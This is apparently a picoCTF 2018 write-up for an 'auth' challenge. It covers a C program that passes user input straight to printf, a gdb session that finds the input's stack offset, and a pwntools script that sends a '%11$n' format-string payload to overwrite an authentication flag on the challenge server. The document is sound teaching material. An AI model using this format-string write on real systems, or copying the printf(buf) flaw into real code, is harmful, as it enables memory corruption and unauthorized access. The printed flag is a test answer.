# Problem
Can you [authenticate](https://2018shell1.picoctf.com/static/abb7371ccb43a3faa3136069ffce8795/auth) to this service and get the flag? Connect with ```nc 2018shell1.picoctf.com 52918```. [Source](https://2018shell1.picoctf.com/static/abb7371ccb43a3faa3136069ffce8795/auth.c).

## Hints:
What happens if you say something OTHER than yes or no?

## Solution:
First we download the files:
```bash
wget https://2018shell1.picoctf.com/static/abb7371ccb43a3faa3136069ffce8795/auth
wget https://2018shell1.picoctf.com/static/abb7371ccb43a3faa3136069ffce8795/auth.c
chmod +x ./auth
```

Now, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

int authenticated = 0;

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

void read_flag() {
  if (!authenticated) {
    printf("Sorry, you are not *authenticated*!\n");
  }
  else {
    printf("Access Granted.\n");
    flag();
  }

}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  printf("Would you like to read the flag? (yes/no)\n");

  fgets(buf, sizeof(buf), stdin);
  
  if (strstr(buf, "no") != NULL) {
    printf("Okay, Exiting...\n");
    exit(1);
  }
  else if (strstr(buf, "yes") == NULL) {
    puts("Received Unknown Input:\n");
    printf(buf);
  }
  
  read_flag();

}
```

```read_flag()``` will print the flag if ```authenticated``` is not false, the problem is that ```authenticated``` is initialized to ```0``` and never changes (rly?)

We can see that if the input (```buf```) does not contain the substring "yes", it is being printed as a format string. We can use it to override authenticated.

Lets investigate, using this gdbinit file:
```bash
break *0x080487f9
run < <(echo "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x")
x/12wx $esp
x &authenticated

Breakpoint 1, 0x080487f9 in main ()
0xffffce40: 0xffffce6c  0x080489a6  0xf7f965c0  0x0804875a
0xffffce50: 0x00000000  0x00c30000  0x00000000  0xffffcf64
0xffffce60: 0x00000000  0x00000000  0x000003e8  0x41414141
$1 = (int *) 0x804a04c <authenticated>
```

We can see that the string "AAAA" (from our input) is being referenced at the eleventh stack element. We can implement arbitrary memory write now.
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'roeesefi'
pw = '123123'

if debug:
  p = process('./vuln')
else:
  p = remote('2018shell1.picoctf.com', 52918)

print p.recvuntil('Would you like to read the flag? (yes/no)')

payload = p32(0x804a04c) + '.%11$n'

p.sendline(payload)

print p.recvall()
```

Access Granted.

Flag: picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}